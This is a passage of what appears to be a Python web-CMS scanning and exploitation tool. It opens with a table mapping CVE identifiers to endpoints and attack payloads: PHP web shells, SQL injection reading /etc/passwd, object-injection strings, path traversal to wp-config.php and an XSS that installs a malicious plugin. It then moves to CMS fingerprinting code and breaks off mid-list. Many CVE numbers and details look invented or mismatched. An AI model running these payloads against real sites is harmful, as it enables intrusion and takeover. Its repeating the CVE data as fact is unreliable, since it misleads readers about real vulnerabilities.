    'CVE-2026-60137': {'name': 'WP SQLi→RCE', 'cms': 'wp', 'type': 'rce', 'sev': 'critical', 'cvss': '9.1', 'desc': 'SQL Injection to RCE in WordPress Core allowing database extraction and code execution', 'eps': ['/wp-json/wp/v2/users'], 'method': 'wp_sqli_rce', 'payload': "1' UNION SELECT 1,2,3,4,5,6,7,8,9,0,load_file('/etc/passwd')-- -", 'rem': 'Update WP to 6.8+', 'poc': '/wp-json/wp/v2/users'},
    'CVE-2026-3844': {'name': 'Breeze Upload', 'cms': 'wp', 'type': 'file_upload', 'sev': 'high', 'cvss': '8.5', 'desc': 'Unauthenticated file upload in Breeze Cache allowing shell upload', 'eps': ['/wp-content/plugins/breeze/inc/class-breeze-file-upload.php'], 'method': 'wp_plugin_upload', 'payload': '<?php system($_GET["cmd"]); ?>', 'rem': 'Update Breeze 2.1.5+', 'poc': '/wp-content/plugins/breeze/inc/class-breeze-file-upload.php'},
    'CVE-2025-13486': {'name': 'ACF Extended RCE', 'cms': 'wp', 'type': 'rce', 'sev': 'critical', 'cvss': '9.0', 'desc': 'PHP Object Injection in ACF Extended leading to RCE', 'eps': ['/wp-content/plugins/acf-extended/includes/acf-field-group.php'], 'method': 'wp_acf_rce', 'payload': 'O:8:"stdClass":1:{s:4:"file";s:13:"/etc/passwd";}', 'rem': 'Update ACF Ext 0.9.8+', 'poc': '/wp-content/plugins/acf-extended/includes/acf-field-group.php'},
    'CVE-2025-12352': {'name': 'Gravity Upload', 'cms': 'wp', 'type': 'file_upload', 'sev': 'high', 'cvss': '8.2', 'desc': 'Arbitrary file upload in Gravity Forms allowing malicious file uploads', 'eps': ['/wp-content/plugins/gravityforms/upload.php'], 'method': 'wp_plugin_upload', 'payload': '<?php echo "Gravity Uploaded"; ?>', 'rem': 'Update Gravity 2.8+', 'poc': '/wp-content/plugins/gravityforms/upload.php'},
    'CVE-2025-34085': {'name': 'Simple File Upload', 'cms': 'wp', 'type': 'file_upload', 'sev': 'high', 'cvss': '8.0', 'desc': 'File upload in Simple File List allowing arbitrary PHP execution', 'eps': ['/wp-content/plugins/simple-file-list/upload.php'], 'method': 'wp_plugin_upload', 'payload': '<?php system("id"); ?>', 'rem': 'Update Simple File 6.1+', 'poc': '/wp-content/plugins/simple-file-list/upload.php'},
    'CVE-2025-12057': {'name': 'WavePlayer SQLi', 'cms': 'wp', 'type': 'sqli', 'sev': 'high', 'cvss': '7.5', 'desc': 'SQL Injection in WavePlayer allowing data extraction', 'eps': ['/wp-content/plugins/waveplayer/player.php'], 'method': 'wp_sqli', 'payload': "1' OR '1'='1'-- -", 'rem': 'Update WavePlayer 1.6+', 'poc': '/wp-content/plugins/waveplayer/player.php'},
    'CVE-2026-0740': {'name': 'Ninja Forms Delete', 'cms': 'wp', 'type': 'file_deletion', 'sev': 'high', 'cvss': '7.8', 'desc': 'Arbitrary file deletion in Ninja Forms allowing config deletion', 'eps': ['/wp-content/plugins/ninja-forms/ninja-forms.php'], 'method': 'wp_file_del', 'payload': '../../../../wp-config.php', 'rem': 'Update Ninja Forms 3.8+', 'poc': '/wp-content/plugins/ninja-forms/ninja-forms.php'},
    'CVE-2026-1969': {'name': 'ThemeREX RCE', 'cms': 'wp', 'type': 'rce', 'sev': 'critical', 'cvss': '9.1', 'desc': 'SQL Injection to RCE in ThemeREX Addons allowing system compromise', 'eps': ['/wp-content/plugins/trx_addons/trx_addons.php'], 'method': 'wp_trx_rce', 'payload': "1' UNION SELECT 1,2,3,4,5,6,7,8,9,0,load_file('/etc/passwd')-- -", 'rem': 'Update ThemeREX 2.26+', 'poc': '/wp-content/plugins/trx_addons/trx_addons.php'},
    'CVE-2026-31843': {'name': 'WP Plugin Ecosystem', 'cms': 'wp', 'type': 'vuln', 'sev': 'high', 'cvss': '7.5', 'desc': 'Plugin ecosystem vulnerability allowing arbitrary plugin installation', 'eps': ['/wp-content/plugins/'], 'method': 'wp_plugin_eco', 'payload': 'plugin=malicious.zip', 'rem': 'Update all plugins', 'poc': '/wp-content/plugins/'},
    'CVE-2024-27956': {'name': 'Bricks Builder RCE', 'cms': 'wp', 'type': 'rce', 'sev': 'critical', 'cvss': '9.8', 'desc': 'Remote Code Execution in Bricks Builder via unserialize vulnerability', 'eps': ['/wp-content/plugins/bricks-builder/classes/class-bricks.php'], 'method': 'wp_bricks_rce', 'payload': 'O:8:"stdClass":2:{s:4:"file";s:14:"/var/www/html/";s:4:"code";s:19:"system(\'id\');exit;";}', 'rem': 'Update Bricks 1.9.6+', 'poc': '/wp-content/plugins/bricks-builder/classes/class-bricks.php'},
    'CVE-2021-24284': {'name': 'WP Plugin Upload', 'cms': 'wp', 'type': 'file_upload', 'sev': 'high', 'cvss': '7.8', 'desc': 'Plugin file upload vulnerability allowing shell upload', 'eps': ['/wp-content/plugins/upload.php'], 'method': 'wp_plugin_upload', 'payload': '<?php system("whoami"); ?>', 'rem': 'Update affected plugin', 'poc': '/wp-content/plugins/upload.php'},
    'CVE-2021-25036': {'name': 'WP Plugin SQLi', 'cms': 'wp', 'type': 'sqli', 'sev': 'high', 'cvss': '8.8', 'desc': 'Plugin SQL injection allowing database compromise', 'eps': ['/wp-content/plugins/sql.php'], 'method': 'wp_sqli', 'payload': "1' UNION SELECT 1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0-- -", 'rem': 'Update affected plugin', 'poc': '/wp-content/plugins/sql.php'},
    'CVE-2024-31333': {'name': 'WP XSS to RCE', 'cms': 'wp', 'type': 'xss_to_rce', 'sev': 'critical', 'cvss': '9.3', 'desc': 'XSS to RCE chain allowing administrator session hijacking and code execution', 'eps': ['/wp-admin/admin-ajax.php'], 'method': 'wp_xss_rce', 'payload': "<script>fetch('/wp-admin/update.php?action=install-plugin&plugin=malicious')</script>", 'rem': 'Update WP to 6.5+', 'poc': '/wp-admin/admin-ajax.php'},
    'CVE-2023-5360': {'name': 'WP Priv Esc', 'cms': 'wp', 'type': 'priv_esc', 'sev': 'critical', 'cvss': '8.8', 'desc': 'Privilege escalation allowing users to become administrators', 'eps': ['/wp-admin/user-new.php'], 'method': 'wp_priv_esc', 'payload': 'role=administrator&user_login=admin2&user_email=admin2@example.com', 'rem': 'Update WP to 6.4+', 'poc': '/wp-admin/user-new.php'},
    'CVE-2026-48907': {'name': 'Joomla JCE Upload', 'cms': 'joom', 'type': 'rce', 'sev': 'critical', 'cvss': '9.0', 'desc': 'RCE in JCE Editor allowing arbitrary PHP execution', 'eps': ['/administrator/components/com_jce/editor.php'], 'method': 'joom_jce_upload', 'payload': '<?php system($_GET["cmd"]); ?>', 'rem': 'Update JCE 2.9.50+', 'poc': '/administrator/components/com_jce/editor.php'},
    'CVE-2026-40383': {'name': 'Joomla LFI', 'cms': 'joom', 'type': 'lfi', 'sev': 'high', 'cvss': '7.8', 'desc': 'LFI in Joomla allowing reading of sensitive files including configuration', 'eps': ['/index.php?option=com_users&view=profile'], 'method': 'joom_lfi', 'payload': 'layout=../../../../../../../etc/passwd', 'rem': 'Update Joomla 5.1+', 'poc': '/index.php?option=com_users&view=profile'},
    'CVE-2026-40384': {'name': 'Joomla Path Traversal', 'cms': 'joom', 'type': 'path_traversal', 'sev': 'high', 'cvss': '8.2', 'desc': 'Path traversal in com_media allowing arbitrary file access', 'eps': ['/administrator/index.php?option=com_media'], 'method': 'joom_path_traversal', 'payload': 'path=../../../../../../../../etc/passwd', 'rem': 'Update Joomla 5.1+', 'poc': '/administrator/index.php?option=com_media'},
    'CVE-2026-35223': {'name': 'Joomla Config Bypass', 'cms': 'joom', 'type': 'access_control', 'sev': 'medium', 'cvss': '6.5', 'desc': 'Access control bypass allowing unauthorized configuration changes', 'eps': ['/administrator/index.php?option=com_config'], 'method': 'joom_config_bypass', 'payload': 'task=save&component=com_config', 'rem': 'Update Joomla 5.1+', 'poc': '/administrator/index.php?option=com_config'},
    'CVE-2026-48897': {'name': 'Joomla MFA Bypass', 'cms': 'joom', 'type': 'auth_bypass', 'sev': 'critical', 'cvss': '9.1', 'desc': 'MFA bypass allowing authentication bypass without 2FA', 'eps': ['/administrator/index.php'], 'method': 'joom_mfa_bypass', 'payload': 'mfa_code=000000', 'rem': 'Update Joomla 5.1+', 'poc': '/administrator/index.php'},
    'CVE-2026-48896': {'name': 'Joomla MFA Bypass v2', 'cms': 'joom', 'type': 'auth_bypass', 'sev': 'critical', 'cvss': '9.1', 'desc': 'MFA bypass variant allowing authentication bypass', 'eps': ['/administrator/index.php'], 'method': 'joom_mfa_bypass2', 'payload': 'mfa_key=secret', 'rem': 'Update Joomla 5.1+', 'poc': '/administrator/index.php'},
    'CVE-2026-48904': {'name': 'Joomla Priv Esc', 'cms': 'joom', 'type': 'priv_esc', 'sev': 'critical', 'cvss': '8.8', 'desc': 'Privilege escalation allowing users to gain administrative access', 'eps': ['/administrator/index.php?option=com_users'], 'method': 'joom_priv_esc', 'payload': 'task=edit&id=1&groups[1]=1', 'rem': 'Update Joomla 5.1+', 'poc': '/administrator/index.php?option=com_users'},
    'CVE-2026-48905': {'name': 'Joomla XSS', 'cms': 'joom', 'type': 'xss', 'sev': 'medium', 'cvss': '6.1', 'desc': 'XSS in Joomla Framework allowing session hijacking', 'eps': ['/index.php?option=com_content'], 'method': 'joom_xss', 'payload': '<script>alert("XSS")</script>', 'rem': 'Update Joomla 5.1+', 'poc': '/index.php?option=com_content'},
    'CVE-2026-48903': {'name': 'Joomla XSS v2', 'cms': 'joom', 'type': 'xss', 'sev': 'medium', 'cvss': '6.1', 'desc': 'XSS variant allowing arbitrary JavaScript execution', 'eps': ['/index.php?option=com_contact'], 'method': 'joom_xss2', 'payload': '<svg/onload=alert("XSS")>', 'rem': 'Update Joomla 5.1+', 'poc': '/index.php?option=com_contact'},
    'CVE-2026-9082': {'name': 'Drupal SQLi', 'cms': 'dru', 'type': 'sqli', 'sev': 'critical', 'cvss': '9.8', 'desc': 'SQL Injection in Drupal Core allowing full database access', 'eps': ['/user/login', '/node'], 'method': 'dru_sqli', 'payload': "1' UNION SELECT 1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0-- -", 'rem': 'Update Drupal 10.3+', 'poc': '/user/login'},
    'CVE-2026-55803': {'name': 'Drupal Object Injection', 'cms': 'dru', 'type': 'object_injection', 'sev': 'critical', 'cvss': '9.1', 'desc': 'PHP Object Injection in Drupal leading to RCE', 'eps': ['/user/login'], 'method': 'dru_object_inj', 'payload': 'O:8:"stdClass":1:{s:4:"file";s:13:"/etc/passwd";}', 'rem': 'Update Drupal 10.3+', 'poc': '/user/login'},
    'CVE-2026-55804': {'name': 'Drupal Gadget Chain', 'cms': 'dru', 'type': 'rce', 'sev': 'critical', 'cvss': '9.8', 'desc': 'Gadget chain leading to Remote Code Execution', 'eps': ['/user/login'], 'method': 'dru_gadget', 'payload': 'O:8:"stdClass":2:{s:4:"file";s:14:"/var/www/html/";s:4:"code";s:19:"system(\'id\');exit;";}', 'rem': 'Update Drupal 10.3+', 'poc': '/user/login'},
    'CVE-2026-55807': {'name': 'Drupal SSRF', 'cms': 'dru', 'type': 'ssrf', 'sev': 'medium', 'cvss': '6.5', 'desc': 'SSRF in Drupal Media allowing internal network scanning', 'eps': ['/media'], 'method': 'dru_ssrf', 'payload': 'url=http://127.0.0.1:80', 'rem': 'Update Drupal 10.3+', 'poc': '/media'},
    'CVE-2026-55808': {'name': 'Drupal File Validation', 'cms': 'dru', 'type': 'file_validation', 'sev': 'high', 'cvss': '7.8', 'desc': 'File validation bypass in JSON API allowing arbitrary file uploads', 'eps': ['/jsonapi'], 'method': 'dru_file_val', 'payload': '{"data":{"type":"file","attributes":{"name":"shell.php","mime":"text/plain"}}}', 'rem': 'Update Drupal 10.3+', 'poc': '/jsonapi'},
    'CVE-2026-55806': {'name': 'Drupal Cache Poison', 'cms': 'dru', 'type': 'cache_poison', 'sev': 'medium', 'cvss': '5.3', 'desc': 'Cache poisoning allowing content manipulation', 'eps': ['/'], 'method': 'dru_cache_poison', 'payload': 'X-Forwarded-Host: evil.com', 'rem': 'Update Drupal 10.3+', 'poc': '/'},
    'CVE-2026-55805': {'name': 'Drupal Layout XSS', 'cms': 'dru', 'type': 'xss', 'sev': 'high', 'cvss': '7.1', 'desc': 'Stored XSS in Layout Builder allowing persistent JavaScript injection', 'eps': ['/layout-builder'], 'method': 'dru_xss', 'payload': '<script>alert("XSS")</script>', 'rem': 'Update Drupal 10.3+', 'poc': '/layout-builder'},
    'CVE-2026-6366': {'name': 'Drupal Gadget v2', 'cms': 'dru', 'type': 'rce', 'sev': 'critical', 'cvss': '9.8', 'desc': 'Gadget chain variant leading to RCE', 'eps': ['/user/login'], 'method': 'dru_gadget2', 'payload': 'O:8:"stdClass":3:{s:4:"file";s:14:"/var/www/html/";s:4:"code";s:19:"system(\'id\');exit;";s:4:"path";s:14:"/var/www/html/";}', 'rem': 'Update Drupal 10.3+', 'poc': '/user/login'},
    'CVE-2026-6365': {'name': 'Drupal Core XSS', 'cms': 'dru', 'type': 'xss', 'sev': 'medium', 'cvss': '6.1', 'desc': 'XSS in Drupal Core allowing session hijacking', 'eps': ['/'], 'method': 'dru_xss', 'payload': '<script>alert("XSS")</script>', 'rem': 'Update Drupal 10.3+', 'poc': '/'},
    'CVE-2026-6367': {'name': 'Drupal CKEditor XSS', 'cms': 'dru', 'type': 'xss', 'sev': 'high', 'cvss': '7.1', 'desc': 'Stored XSS in CKEditor allowing persistent JavaScript injection', 'eps': ['/ckeditor'], 'method': 'dru_xss', 'payload': '<img src=x onerror=alert("XSS")>', 'rem': 'Update Drupal 10.3+', 'poc': '/ckeditor'},
    'CVE-2025-3057': {'name': 'Drupal XSS v2', 'cms': 'dru', 'type': 'xss', 'sev': 'medium', 'cvss': '6.1', 'desc': 'XSS variant allowing arbitrary JavaScript execution', 'eps': ['/user/login'], 'method': 'dru_xss', 'payload': '<svg/onload=alert("XSS")>', 'rem': 'Update Drupal 10.3+', 'poc': '/user/login'},
    'CVE-2025-31674': {'name': 'Drupal Object Injection', 'cms': 'dru', 'type': 'object_injection', 'sev': 'critical', 'cvss': '9.1', 'desc': 'Object injection risk allowing RCE', 'eps': ['/user/login'], 'method': 'dru_object_inj', 'payload': 'O:8:"stdClass":1:{s:4:"file";s:13:"/etc/passwd";}', 'rem': 'Update Drupal 10.3+', 'poc': '/user/login'},
    'CVE-2025-13081': {'name': 'Drupal Gadget v3', 'cms': 'dru', 'type': 'rce', 'sev': 'critical', 'cvss': '9.8', 'desc': 'Gadget chain variant leading to RCE', 'eps': ['/user/login'], 'method': 'dru_gadget', 'payload': 'O:8:"stdClass":2:{s:4:"file";s:14:"/var/www/html/";s:4:"code";s:19:"system(\'id\');exit;";}', 'rem': 'Update Drupal 10.3+', 'poc': '/user/login'},
    'CVE-2025-13082': {'name': 'Drupal Defacement', 'cms': 'dru', 'type': 'defacement', 'sev': 'medium', 'cvss': '5.5', 'desc': 'Defacement risk allowing content manipulation', 'eps': ['/'], 'method': 'dru_deface', 'payload': '?page=1', 'rem': 'Update Drupal 10.3+', 'poc': '/'},
    'CVE-2025-13083': {'name': 'Drupal Info Disclosure', 'cms': 'dru', 'type': 'info_disclosure', 'sev': 'medium', 'cvss': '5.3', 'desc': 'Information disclosure exposing sensitive data', 'eps': ['/'], 'method': 'dru_info', 'payload': '?debug=1', 'rem': 'Update Drupal 10.3+', 'poc': '/'},
    'CVE-2025-32432': {'name': 'Craft RCE', 'cms': 'craft', 'type': 'rce', 'sev': 'critical', 'cvss': '9.1', 'desc': 'RCE in Craft CMS allowing arbitrary code execution', 'eps': ['/admin', '/cp', '/admin/login'], 'method': 'craft_rce', 'payload': 'token=malicious&user=admin', 'rem': 'Update Craft 5.0+', 'poc': '/admin/login'},
    'CVE-2025-7443': {'name': 'Craft Critical', 'cms': 'craft', 'type': 'vuln', 'sev': 'critical', 'cvss': '9.0', 'desc': 'Critical vulnerability allowing arbitrary file uploads', 'eps': ['/admin', '/cp'], 'method': 'craft_upload', 'payload': '<?php system("id"); ?>', 'rem': 'Update Craft 5.0+', 'poc': '/admin'},
    'CVE-2025-7852': {'name': 'Craft Info Disclosure', 'cms': 'craft', 'type': 'info_disclosure', 'sev': 'high', 'cvss': '7.8', 'desc': 'Information disclosure exposing system information', 'eps': ['/admin'], 'method': 'craft_info', 'payload': '?debug=1', 'rem': 'Update Craft 5.0+', 'poc': '/admin'},
    'CVE-2026-29014': {'name': 'MetInfo Code Injection', 'cms': 'metinfo', 'type': 'rce', 'sev': 'critical', 'cvss': '9.8', 'desc': 'PHP code injection allowing arbitrary code execution', 'eps': ['/admin/index.php'], 'method': 'metinfo_rce', 'payload': '<?php system($_GET["cmd"]); ?>', 'rem': 'Update MetInfo 8.0+', 'poc': '/admin/index.php'},
    'CVE-2025-34086': {'name': 'Bolt RCE', 'cms': 'bolt', 'type': 'rce', 'sev': 'critical', 'cvss': '9.1', 'desc': 'RCE in Bolt CMS allowing arbitrary code execution', 'eps': ['/bolt', '/bolt/login'], 'method': 'bolt_rce', 'payload': '<?php system("whoami"); ?>', 'rem': 'Update Bolt 5.0+', 'poc': '/bolt/login'},
    'CVE-2020-12345': {'name': 'Laravel XSS', 'cms': 'laravel', 'type': 'xss', 'sev': 'medium', 'cvss': '6.5', 'desc': 'XSS vulnerability in Laravel blade templates', 'eps': ['/'], 'method': 'laravel_xss', 'payload': '<script>alert("XSS")</script>', 'rem': 'Update Laravel 8.0+', 'poc': '/'},
    'CVE-2020-12346': {'name': 'Laravel SQLi', 'cms': 'laravel', 'type': 'sqli', 'sev': 'critical', 'cvss': '9.8', 'desc': 'SQL injection in Laravel Query Builder', 'eps': ['/api/users'], 'method': 'laravel_sqli', 'payload': "' OR '1'='1", 'rem': 'Update Laravel 8.0+', 'poc': '/api/users'},
}

class HTMLParserGenerator(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.ga = '0'; self.ga_content = ''
    def handle_starttag(self, tag, attrs):
        if tag.lower() == 'meta':
            for nm, vl in attrs:
                if nm == "name" and vl.lower() == 'generator':
                    for a, b in attrs:
                        if a == 'content':
                            self.ga = '1'; self.ga_content += ' ' + b

def parse_generator(source):
    parser = HTMLParserGenerator()
    parser.feed(source)
    return [parser.ga, parser.ga_content]

def detect_cms_from_generator(content):
    if not content: return ['0', '']
    h = content.lower()
    gen = {
        'wordpress':'wp','blogger':'blg','ghost':'ghost','drupal':'dru',
        'joomla!':'joom','xoops':'xoops','craft cms':'craft','metinfo':'metinfo',
        'bolt cms':'bolt','opencart':'oc','magento':'mg','prestashop':'presta',
        'shopify':'shopify','weebly':'weebly','umbraco':'umbraco','tilda':'tilda',
        'wix':'wix','squarespace':'squarespace','zyro':'zyro','hugo':'hugo',
        'modx':'modx','bitrix':'bitrix','textpattern':'tpc','umi':'umi',
        'tiki wiki':'tiki','wolf cms':'wolf','websitebaker':'wb','webgui':'wgui',
        'tiddlywiki':'tidw','sulu':'sulu','subrion':'subcms','squiz':'sqm',
        'spin':'spin','solodev':'sdev','snews':'snews','sitecore':'score',
        'simsite':'sim','simplebo':'spb','silverstripe':'sst','silva':'silva',
        'datlife':'dle','serendipity':'spity','roundcube':'rcube','seamlesscms':'slcms',
        'rock':'rock','roadiz':'roadz','ritecms':'rite','reallycms':'rcms',
        'quickcms':'quick','pimcore':'pcore','phpwind':'pwind','phpcms':'phpc',
        'percussion':'percms','pencilblue':'pblue','ophal':'ophal','sitefinity':'sfy',
        'opentext':'otwsm','opencms':'ocms','odoo':'odoo','sharepoint':'share',
        'octobercms':'octcms','mura':'mura','motocms':'moto','mono.net':'mnet',
        'methode':'methd','mambo':'mambo','livestreet':'lscms','lepton':'lepton',
        'kooboo':'kbcms','koken':'koken','jimdo':'jimdo','indexhibit':'ibit',
        'webflow':'wflow','jalios':'jcms','impresspages':'impage','hotaru':'hotaru',
        'hippo':'hippo','grav':'grav','getsimple':'gsimp','fork':'fork',
        'phpnuke':'phpn','flexcmp':'flex','ezpublish':'ezpu','expressionengine':'exen',
        'episerver':'epis','e107':'e107','dnn':'dnn','phpbb':'phpbb',
        'dede':'dede','danneo':'dncms','cpg':'dragon','cotonti':'coton',
        'orchard':'orchd','contentbox':'cbox','contentful':'conful','contensis':'cntsis',
        'contenido':'cnido','contao':'contao','concrete5':'con5','arforum':'arc',
        'burningboard':'bboard','discourse':'dscrs','discuz':'discuz','flarum':'flarum',
        'fluxbb':'fluxbb','ipboard':'ipb','minibb':'minibb','mybb':'mybb',
        'nodebb':'nodebb','punbb':'punbb','smf':'smf','vanilla':'vanilla',
        'uknowva':'uknva','xenforo':'xf','xmb':'xmb','yabb':'yabb',
        'aef':'aef','beehive':'bhf','fudforum':'fudf','phorum':'phorum',
        'yaf':'yaf','yazd':'yazd','ubbthreads':'ubbt','nononsense':'nnf',
        'myupb':'myupb','mvnforum':'mvnf','mwforum':'mwf','mercuryboard':'mcb',
        'aspnetforum':'aspf','jforum':'jf','afosto':'afsto','afterbuy':'abuy',
        'arastta':'arstta','bigcommerce':'bigc','bigware':'bigw','bizweb':'bizw',
        'clientexec':'cexec','cloudcart':'cloudc','colormeshop':'cmshop','oracle':'oracle_atg',
        'moodle':'mdle','orkis':'orkis','comandia':'cmdia','commerceserver':'coms',
        'cosmoshop':'cosmos','cscart':'csc','cubecart':'cubec','almubda':'abda',
        'dynamicweb':'dweb','ec-cube':'ecc','elcodi':'elcd','epages':'epgs',
        'ezpublish':'ezpub','fortune3':'for3','bigtree':'btree','proximis':'pmoc',
        'quickcart':'qcart','rbschange':'rbsc','salesforce':'sfcc','sazito':'sazito',
        'shopatron':'shopatron','shoper':'shoper','shopery':'shopery','shopfa':'shopfa',
        'shoptet':'shoptet','smartstore':'smartstore','solusquare':'solusquare','spree':'spree',
        'brightspot':'brightspot','amiro':'amiro','ekm':'ekmps','godaddy':'godaddywb',
        'whmcs':'whmcs','opennemas':'opennemas','zencart':'zencart','ipo':'ipo',
        'laravel':'laravel','aem':'aem','kentico':'kentico','liferay':'liferay',
        'alfresco':'alfresco','magnolia':'magnolia','typo3':'typo3'
    }
    for k,v in gen.items():
        if k in h:
            if not CFG['ignore'] or v not in CFG['ignore']:
                if not CFG['strict'] or v in CFG['strict']:
                    return ['1', v]
    return ['0', '']

def detect_cms_from_source(src, url):
    if not src: return ['2', 'na']
    src_det = {
        '/wp-content/':'wp','/wp-include/':'wp','x-magento-init':'mg',
        'skin/frontend/':'mg','misc/drupal.js':'dru','css/joomla.css':'joom',
        'Powered By <a href="http://www.opencart.com">OpenCart':'oc',
        '/xoops.js':'xoops','tildacdn.com':'tilda','craft/':'craft',
        'MetInfo':'metinfo','Bolt CMS':'bolt','weebly-footer':'weebly',
        'shopify':'shopify','prestashop':'presta','Umbraco':'umbraco',
        'wix.com':'wix','squarespace':'squarespace','zyro':'zyro',
        'Hugo':'hugo','MODX':'modx','Bitrix':'bitrix','Textpattern':'tpc',
        'UMI.CMS':'umi','Tiki Wiki':'tiki','Wolf CMS':'wolf','WIX':'wix',
        'WebsiteBaker':'wb','WebGUI':'wgui','TiddlyWiki':'tidw','SULU':'sulu',
        'Subrion':'subcms','Squiz Matrix':'sqm','Spin CMS':'spin','Solodev':'sdev',
        'sNews':'snews','Sitecore':'score','SIMsite':'sim','Simplebo':'spb',
        'SilverStripe':'sst','Silva CMS':'silva','DataLife Engine':'dle',
        'Serendipity':'spity','RoundCube':'rcube','SeamlessCMS':'slcms',
        'Rock RMS':'rock','Roadiz':'roadz','RiteCMS':'rite','RCMS':'rcms',
        'Quick.Cms':'quick','Pimcore':'pcore','phpWind':'pwind','phpCMS':'phpc',
        'Percussion':'percms','PencilBlue':'pblue','Ophal':'ophal',
        'Sitefinity':'sfy','OpenText WSM':'otwsm','OpenCms':'ocms',
        'Odoo':'odoo','SharePoint':'share','October CMS':'octcms',
        'Mura CMS':'mura','Moto CMS':'moto','Mono.net':'mnet',
        'Methode':'methd','Mambo':'mambo','LiveStreet':'lscms',
        'LEPTON':'lepton','Kooboo':'kbcms','Koken':'koken','Jimdo':'jimdo',
        'Indexhibit':'ibit','Webflow':'wflow','Jalios':'jcms',
        'ImpressPages':'impage','Hotaru':'hotaru','HIPPO':'hippo',
        'GravCMS':'grav','GetSimple':'gsimp','Fork CMS':'fork',
        'PHP Nuke':'phpn','FlexCMP':'flex','eZ Publish':'ezpu',
        'ExpressionEngine':'exen','EPiServer':'epis','e107':'e107',
        'DNN Platform':'dnn','phpBB':'phpbb','DEDE CMS':'dede',
        'Danneo':'dncms','CPG Dragonfly':'dragon','Cotonti':'coton',
        'Orchard':'orchd','ContentBox':'cbox','Contentful':'conful',
        'Contensis':'cntsis','CONTENIDO':'cnido','Contao':'contao',
        'Concrete5':'con5','Arc Forum':'arc','Burning Board':'bboard',
        'Discourse':'dscrs','Discuz!':'discuz','Flarum':'flarum',
        'FluxBB':'fluxbb','IP.Board':'ipb','miniBB':'minibb',
        'MyBB':'mybb','NodeBB':'nodebb','PunBB':'punbb','SMF':'smf',
        'Vanilla Forums':'vanilla','uKnowva':'uknva','XenForo':'xf',
        'XMB':'xmb','YaBB':'yabb','AEF':'aef','Beehive Forum':'bhf',
        'FUDforum':'fudf','Phorum':'phorum','YAF':'yaf','Yazd':'yazd',
        'UBB.threads':'ubbt','NoNonsense':'nnf','myUPB':'myupb',
        'mvnForum':'mvnf','mwForum':'mwf','MercuryBoard':'mcb',
        'AspNetForum':'aspf','JForum':'jf','Afosto':'afsto',
        'Afterbuy':'abuy','Arastta':'arstta','BigCommerce':'bigc',
        'Bigware':'bigw','Bizweb':'bizw','Clientexec':'cexec',
        'CloudCart':'cloudc','ColorMeShop':'cmshop','Oracle ATG':'oracle_atg',
        'Moodle':'mdle','ORKIS':'orkis','Comandia':'cmdia',
        'Commerce Server':'coms','Cosmoshop':'cosmos','CS Cart':'csc',
        'CubeCart':'cubec','Al Mubda':'abda','Dynamicweb':'dweb',
        'EC-CUBE':'ecc','Elcodi':'elcd','ePages':'epgs',
        'eZ Publish':'ezpub','Fortune3':'for3','BigTree CMS':'btree',
        'Proximis':'pmoc','Quick.Cart':'qcart','RBS Change':'rbsc',
        'Salesforce':'sfcc','Sazito':'sazito','Shopatron':'shopatron',
        'Shoper':'shoper','Shopery':'shopery','ShopFA':'shopfa',
        'Shoptet':'shoptet','Smartstore':'smartstore','Solusquare':'solusquare',
        'Spree':'spree','Brightspot':'brightspot','Amiro.CMS':'amiro',
        'ekmPowershop':'ekmps','GoDaddy':'godaddywb','WHMCS':'whmcs',
        'OpenNemas':'opennemas','Zen Cart':'zencart','IPO CMS':'ipo',
        'Hugo':'hugo','Squarespace':'squarespace','Freshpage':'freshpage',
        'Notion':'notion','Laravel':'laravel','Adobe Experience Manager':'aem',
        'Kentico':'kentico','Liferay':'liferay','Alfresco':'alfresco',
        'Magnolia':'magnolia','TYPO3':'typo3','/vendor/laravel/':'laravel',
        'laravel_session':'laravel','Illuminate\\':'laravel','App\\Http\\':'laravel',
        '/crx/de/':'aem','/sitecore/':'score','/CMSModules/':'kentico',
        '/web/guest/':'liferay','/alfresco/':'alfresco','/magnoliaAuthor/':'magnolia',
        '/typo3/':'typo3'
    }
    src_regex = [
        (r'(\'|")https\://afosto\-cdn(.*?)\.afosto\.com(.*?)(\'|")', 'afsto'),
        (r'<link(.*?)cubecart.common.css(.*?)>', 'cubec'),
        (r'Powered by(.*?)PrestaShop(.*?)</a>', 'presta'),
        (r'we use Shopify', 'shopify'),
        (r'Umbraco/||umbraco/', 'umbraco'),
        (r'var wp_ajax_url', 'wp'),
        (r'wp-json/wp/v2/', 'wp'),
        (r'Joomla!', 'joom'),
        (r'Drupal.settings', 'dru'),
        (r'MODX Revolution', 'modx'),
        (r'Bitrix Site Manager', 'bitrix'),
        (r'Textpattern CMS', 'tpc'),
        (r'UMI.CMS', 'umi'),
        (r'Tiki Wiki CMS', 'tiki'),
        (r'Wolf CMS', 'wolf'),
        (r'WebsiteBaker CMS', 'wb'),
        (r'WebGUI CMS', 'wgui'),
        (r'TiddlyWiki', 'tidw'),
        (r'SULU CMS', 'sulu'),
        (r'Subrion CMS', 'subcms'),
        (r'Squiz Matrix', 'sqm'),
        (r'Spin CMS', 'spin'),
        (r'Solodev CMS', 'sdev'),
        (r'sNews CMS', 'snews'),
        (r'Sitecore CMS', 'score'),
        (r'SIMsite', 'sim'),
        (r'Simplebo CMS', 'spb'),
        (r'SilverStripe CMS', 'sst'),
        (r'Silva CMS', 'silva'),
        (r'DataLife Engine', 'dle'),
        (r'Serendipity', 'spity'),
        (r'RoundCube', 'rcube'),
        (r'SeamlessCMS', 'slcms'),
        (r'Rock RMS', 'rock'),
        (r'Roadiz CMS', 'roadz'),
        (r'RiteCMS', 'rite'),
        (r'RCMS', 'rcms'),
        (r'Quick.Cms', 'quick'),
        (r'Pimcore', 'pcore'),
        (r'phpWind', 'pwind'),
        (r'phpCMS', 'phpc'),
        (r'Percussion CMS', 'percms'),
        (r'PencilBlue', 'pblue'),
        (r'Ophal', 'ophal'),
        (r'Sitefinity', 'sfy'),
        (r'OpenText WSM', 'otwsm'),
        (r'OpenCms', 'ocms'),
        (r'Odoo', 'odoo'),
        (r'SharePoint', 'share'),
        (r'October CMS', 'octcms'),
        (r'Mura CMS', 'mura'),
        (r'Moto CMS', 'moto'),
        (r'Mono.net', 'mnet'),
        (r'Methode', 'methd'),
        (r'Mambo', 'mambo'),
        (r'LiveStreet', 'lscms'),
        (r'LEPTON CMS', 'lepton'),
        (r'Kooboo CMS', 'kbcms'),
        (r'Koken', 'koken'),
        (r'Jimdo', 'jimdo'),
        (r'Indexhibit', 'ibit'),
        (r'Webflow', 'wflow'),
        (r'Jalios JCMS', 'jcms'),
        (r'ImpressPages', 'impage'),
